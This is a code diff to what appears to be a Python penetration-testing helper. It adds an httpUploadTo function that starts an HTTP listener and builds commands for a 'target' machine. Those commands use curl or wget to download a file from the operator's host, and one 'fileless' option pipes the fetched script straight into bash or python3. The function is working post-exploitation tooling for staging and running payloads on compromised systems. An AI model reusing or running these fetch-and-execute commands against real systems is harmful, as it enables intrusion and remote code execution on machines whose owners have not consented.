@@ -1,6 +1,7 @@
 from helpers import populateChoices, pasta, verifyHash
 from subprocess import run, DEVNULL, PIPE
 from os import path
+from services import startHTTP, stopHTTP
 
 Download_Methods = [
     'wget',
@@ -91,3 +92,42 @@ def base64UploadTo(filePath, method):
     pasta(cmd)
 
     verifyHash(filePath)
+
+def httpUploadTo(filePath, method):
+    # GET FILE ABSOLUTE PATH
+    filename = path.basename(path.normpath(filePath))
+
+    proc, listenIP, listenPort = startHTTP()
+
+    entrymsg = '[+] Select linux target download method:'
+    choice = populateChoices(entrymsg, Download_Methods)
+
+    if choice == 'cURL':
+        if method == 'HTTP':
+            cmd = '# DOWNLOAD ' + filename.upper() + ' ON TARGET\n'
+            cmd += 'curl http://' + listenIP + ':' + listenPort + '/' + filename + ' -o ' + filename
+        elif method == 'HTTP - Fileless':
+            entrymsg = '[+] Select file type being uploaded:'
+            choice = populateChoices(entrymsg, Fileless_Types)
+            cmd = '# EXECUTE ' + filename.upper() + ' ON TARGET\n'
+            if choice == 'BASH script (.sh)':
+                cmd += 'curl http://' + listenIP + ':' + listenPort + '/' + filename + ' | bash'
+            elif choice == 'Python script (.py)':
+                cmd += 'curl http://' + listenIP + ':' + listenPort + '/' + filename + ' | python3'
+    elif choice == 'wget':
+        if method == 'HTTP':
+            cmd = '# DOWNLOAD ' + filename.upper() + ' ON TARGET\n'
+            cmd += 'wget http://' + listenIP + ':' + listenPort + '/' + filename
+        elif method == 'HTTP - Fileless':
+            entrymsg = '[+] Select file type being uploaded:'
+            choice = populateChoices(entrymsg, Fileless_Types)
+            cmd = '# EXECUTE ' + filename.upper() + ' ON TARGET\n'
+            if choice == 'BASH script (.sh)':
+                cmd += 'wget -qO- http://' + listenIP + ':' + listenPort + '/' + filename + ' | bash'
+            elif choice == 'Python script (.py)':
+                cmd += 'wget -qO- http://' + listenIP + ':' + listenPort + '/' + filename + ' | python3'
+    else:
+        print('[!] Not yet implemented')
+
+    pasta(cmd)
+    stopHTTP(proc)
